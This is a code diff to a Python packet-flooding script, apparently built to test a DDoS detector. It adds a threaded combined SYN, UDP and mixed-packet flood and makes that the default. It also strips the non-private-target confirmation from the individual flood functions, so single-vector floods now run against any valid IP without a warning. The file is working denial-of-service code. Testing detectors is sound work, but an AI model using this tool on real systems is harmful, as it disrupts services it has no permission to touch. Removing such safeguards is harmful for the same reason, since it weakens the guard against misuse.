@@ -13,6 +13,8 @@ import time
 import argparse
 import ipaddress
 import re
+import threading
+from concurrent.futures import ThreadPoolExecutor
 
 
 def validate_ip_address(ip: str) -> bool:
@@ -55,7 +57,7 @@ def print_banner():
     print()
 
 
-def syn_flood(target_ip, target_port=80, count=200, delay=0.001):
+def syn_flood(target_ip, target_port=80, count=200, delay=0.001, silent=False):
     """
     Simulate a SYN flood attack.
     
@@ -64,24 +66,14 @@ def syn_flood(target_ip, target_port=80, count=200, delay=0.001):
         target_port (int): Target port (default: 80)
         count (int): Number of packets to send (default: 200)
         delay (float): Delay between packets in seconds (default: 0.001)
+        silent (bool): If True, suppress progress output (default: False)
     """
-    # Validate IP address
-    if not validate_ip_address(target_ip):
-        print(f"❌ Error: Invalid IP address '{target_ip}'")
-        return
-    
-    if not is_private_or_localhost(target_ip):
-        print(f"⚠️  Warning: Target IP {target_ip} is not private/localhost")
-        confirm = input("Are you sure you want to proceed? (yes/no): ")
-        if confirm.lower() != 'yes':
-            print("Attack cancelled.")
-            return
-    
-    print(f"🔥 Starting SYN Flood Attack")
-    print(f"   Target: {target_ip}:{target_port}")
-    print(f"   Packets: {count}")
-    print(f"   Delay: {delay}s")
-    print()
+    if not silent:
+        print(f"🔥 Starting SYN Flood Attack")
+        print(f"   Target: {target_ip}:{target_port}")
+        print(f"   Packets: {count}")
+        print(f"   Delay: {delay}s")
+        print()
     
     sent = 0
     try:
@@ -91,18 +83,25 @@ def syn_flood(target_ip, target_port=80, count=200, delay=0.001):
             send(packet, verbose=0)
             sent += 1
             
-            if sent % 50 == 0:
-                print(f"   Sent: {sent}/{count} packets...")
+            if not silent and sent % 50 == 0:
+                print(f"   [SYN] Sent: {sent}/{count} packets...")
             
             time.sleep(delay)
     
     except KeyboardInterrupt:
-        print(f"\n⚠️  Attack interrupted by user")
+        if not silent:
+            print(f"\n⚠️  SYN Attack interrupted")
+    except Exception as e:
+        if not silent:
+            print(f"\n❌ SYN Attack error: {e}")
     
-    print(f"\n✅ Attack complete. Sent {sent} SYN packets.")
+    if not silent:
+        print(f"\n✅ SYN Attack complete. Sent {sent} packets.")
+    
+    return sent
 
 
-def packet_flood(target_ip, target_port=80, count=150, delay=0.001):
+def packet_flood(target_ip, target_port=80, count=150, delay=0.001, silent=False):
     """
     Simulate a general packet flood attack.
     
@@ -111,24 +110,14 @@ def packet_flood(target_ip, target_port=80, count=150, delay=0.001):
         target_port (int): Target port (default: 80)
         count (int): Number of packets to send (default: 150)
         delay (float): Delay between packets in seconds (default: 0.001)
+        silent (bool): If True, suppress progress output (default: False)
     """
-    # Validate IP address
-    if not validate_ip_address(target_ip):
-        print(f"❌ Error: Invalid IP address '{target_ip}'")
-        return
-    
-    if not is_private_or_localhost(target_ip):
-        print(f"⚠️  Warning: Target IP {target_ip} is not private/localhost")
-        confirm = input("Are you sure you want to proceed? (yes/no): ")
-        if confirm.lower() != 'yes':
-            print("Attack cancelled.")
-            return
-    
-    print(f"🔥 Starting Packet Flood Attack")
-    print(f"   Target: {target_ip}:{target_port}")
-    print(f"   Packets: {count}")
-    print(f"   Delay: {delay}s")
-    print()
+    if not silent:
+        print(f"🔥 Starting Packet Flood Attack")
+        print(f"   Target: {target_ip}:{target_port}")
+        print(f"   Packets: {count}")
+        print(f"   Delay: {delay}s")
+        print()
     
     sent = 0
     try:
@@ -144,18 +133,25 @@ def packet_flood(target_ip, target_port=80, count=150, delay=0.001):
             send(packet, verbose=0)
             sent += 1
             
-            if sent % 50 == 0:
-                print(f"   Sent: {sent}/{count} packets...")
+            if not silent and sent % 50 == 0:
+                print(f"   [PACKET] Sent: {sent}/{count} packets...")
             
             time.sleep(delay)
     
     except KeyboardInterrupt:
-        print(f"\n⚠️  Attack interrupted by user")
+        if not silent:
+            print(f"\n⚠️  Packet Attack interrupted")
+    except Exception as e:
+        if not silent:
+            print(f"\n❌ Packet Attack error: {e}")
     
-    print(f"\n✅ Attack complete. Sent {sent} mixed packets.")
+    if not silent:
+        print(f"\n✅ Packet Attack complete. Sent {sent} packets.")
+    
+    return sent
 
 
-def udp_flood(target_ip, target_port=53, count=150, delay=0.001):
+def udp_flood(target_ip, target_port=53, count=150, delay=0.001, silent=False):
     """
     Simulate a UDP flood attack.
     
@@ -163,6 +159,49 @@ def udp_flood(target_ip, target_port=53, count=150, delay=0.001):
         target_ip (str): Target IP address
         target_port (int): Target port (default: 53 for DNS)
         count (int): Number of packets to send (default: 150)
+        delay (float): Delay between packets in seconds (default: 0.001)
+        silent (bool): If True, suppress progress output (default: False)
+    """
+    if not silent:
+        print(f"🔥 Starting UDP Flood Attack")
+        print(f"   Target: {target_ip}:{target_port}")
+        print(f"   Packets: {count}")
+        print(f"   Delay: {delay}s")
+        print()
+    
+    sent = 0
+    try:
+        for i in range(count):
+            packet = IP(dst=target_ip) / UDP(dport=target_port) / ("X" * 1024)
+            send(packet, verbose=0)
+            sent += 1
+            
+            if not silent and sent % 50 == 0:
+                print(f"   [UDP] Sent: {sent}/{count} packets...")
+            
+            time.sleep(delay)
+    
+    except KeyboardInterrupt:
+        if not silent:
+            print(f"\n⚠️  UDP Attack interrupted")
+    except Exception as e:
+        if not silent:
+            print(f"\n❌ UDP Attack error: {e}")
+    
+    if not silent:
+        print(f"\n✅ UDP Attack complete. Sent {sent} packets.")
+    
+    return sent
+
+
+def combined_attack(target_ip, target_port=80, count=200, delay=0.001):
+    """
+    Launch all three attack types simultaneously.
+    
+    Args:
+        target_ip (str): Target IP address
+        target_port (int): Target port (default: 80)
+        count (int): Number of packets per attack type (default: 200)
         delay (float): Delay between packets in seconds (default: 0.001)
     """
     # Validate IP address
@@ -177,28 +216,80 @@ def udp_flood(target_ip, target_port=53, count=150, delay=0.001):
             print("Attack cancelled.")
             return
     
-    print(f"🔥 Starting UDP Flood Attack")
+    print(f"🔥🔥🔥 Starting COMBINED MULTI-VECTOR ATTACK 🔥🔥🔥")
     print(f"   Target: {target_ip}:{target_port}")
-    print(f"   Packets: {count}")
+    print(f"   Packets per attack: {count}")
     print(f"   Delay: {delay}s")
+    print(f"   Attack vectors: SYN Flood + UDP Flood + Packet Flood")
     print()
     
-    sent = 0
-    try:
-        for i in range(count):
-            packet = IP(dst=target_ip) / UDP(dport=target_port) / ("X" * 1024)
-            send(packet, verbose=0)
-            sent += 1
-            
-            if sent % 50 == 0:
-                print(f"   Sent: {sent}/{count} packets...")
-            
-            time.sleep(delay)
+    results = {'syn': 0, 'udp': 0, 'packet': 0}
+    start_time = time.time()
     
-    except KeyboardInterrupt:
-        print(f"\n⚠️  Attack interrupted by user")
+    # Use ThreadPoolExecutor for better control
+    with ThreadPoolExecutor(max_workers=3) as executor:
+        print("⚡ Launching all attack vectors simultaneously...")
+        print()
+        
+        # Submit all attacks
+        future_syn = executor.submit(syn_flood, target_ip, target_port, count, delay, silent=True)
+        future_udp = executor.submit(udp_flood, target_ip, target_port + 1, count, delay, silent=True)
+        future_packet = executor.submit(packet_flood, target_ip, target_port + 2, count, delay, silent=True)
+        
+        # Monitor progress
+        try:
+            completed = 0
+            while completed < 3:
+                time.sleep(1)
+                status = []
+                
+                if future_syn.done():
+                    if 'syn' not in [k for k, v in results.items() if v > 0]:
+                        results['syn'] = future_syn.result() if not future_syn.exception() else 0
+                        status.append("✓ SYN")
+                        completed += 1
+                else:
+                    status.append("⚡ SYN")
+                
+                if future_udp.done():
+                    if 'udp' not in [k for k, v in results.items() if v > 0]:
+                        results['udp'] = future_udp.result() if not future_udp.exception() else 0
+                        status.append("✓ UDP")
+                        completed += 1
+                else:
+                    status.append("⚡ UDP")
+                
+                if future_packet.done():
+                    if 'packet' not in [k for k, v in results.items() if v > 0]:
+                        results['packet'] = future_packet.result() if not future_packet.exception() else 0
+                        status.append("✓ PACKET")
+                        completed += 1
+                else:
+                    status.append("⚡ PACKET")
+                
+                print(f"\r   Status: {' | '.join(status)}", end='', flush=True)
+        
+        except KeyboardInterrupt:
+            print("\n\n⚠️  Attack interrupted by user")
+            executor.shutdown(wait=False, cancel_futures=True)
+            return
     
-    print(f"\n✅ Attack complete. Sent {sent} UDP packets.")
+    duration = time.time() - start_time
+    total_packets = sum(results.values())
+    
+    print("\n")
+    print("="*70)
+    print("📊 COMBINED ATTACK SUMMARY")
+    print("="*70)
+    print(f"   Target:           {target_ip}")
+    print(f"   Duration:         {duration:.2f} seconds")
+    print(f"   Total Packets:    {total_packets}")
+    print()
+    print(f"   SYN Packets:      {results['syn']}")
+    print(f"   UDP Packets:      {results['udp']}")
+    print(f"   Mixed Packets:    {results['packet']}")
+    print(f"   Packets/second:   {total_packets/duration:.2f}")
+    print("="*70)
 
 
 def main():
@@ -208,6 +299,9 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
+  # Combined multi-vector attack (SYN + UDP + Packet floods simultaneously)
+  sudo python3 simulate_attack.py --target 127.0.0.1 --type all
+  
   # SYN flood attack against localhost
   sudo python3 simulate_attack.py --target 127.0.0.1 --type syn
   
@@ -223,13 +317,13 @@ IMPORTANT: Only use on systems you own or have permission to test!
     
     parser.add_argument('--target', '-t', required=True, 
                        help='Target IP address')
-    parser.add_argument('--type', '-T', choices=['syn', 'packet', 'udp'], 
-                       default='syn',
-                       help='Attack type (default: syn)')
+    parser.add_argument('--type', '-T', choices=['syn', 'packet', 'udp', 'all'], 
+                       default='all',
+                       help='Attack type (default: all - launches all attacks simultaneously)')
     parser.add_argument('--port', '-p', type=int, default=80,
                        help='Target port (default: 80)')
     parser.add_argument('--count', '-c', type=int, default=200,
-                       help='Number of packets to send (default: 200)')
+                       help='Number of packets to send per attack type (default: 200)')
     parser.add_argument('--delay', '-d', type=float, default=0.001,
                        help='Delay between packets in seconds (default: 0.001)')
     
@@ -259,8 +353,15 @@ IMPORTANT: Only use on systems you own or have permission to test!
     
     print()
     
+    # Validate target IP before confirmation
+    if not validate_ip_address(args.target):
+        print(f"❌ Error: Invalid IP address '{args.target}'")
+        sys.exit(1)
+    
     # Execute the attack
-    if args.type == 'syn':
+    if args.type == 'all':
+        combined_attack(args.target, args.port, args.count, args.delay)
+    elif args.type == 'syn':
         syn_flood(args.target, args.port, args.count, args.delay)
     elif args.type == 'packet':
         packet_flood(args.target, args.port, args.count, args.delay)
@@ -269,7 +370,7 @@ IMPORTANT: Only use on systems you own or have permission to test!
     
     print()
     print("="*70)
-    print("Check your DDoS detector for alerts and blocked IPs!")
+    print("✅ Check your DDoS detector for alerts and blocked IPs!")
     print("="*70)
 
 
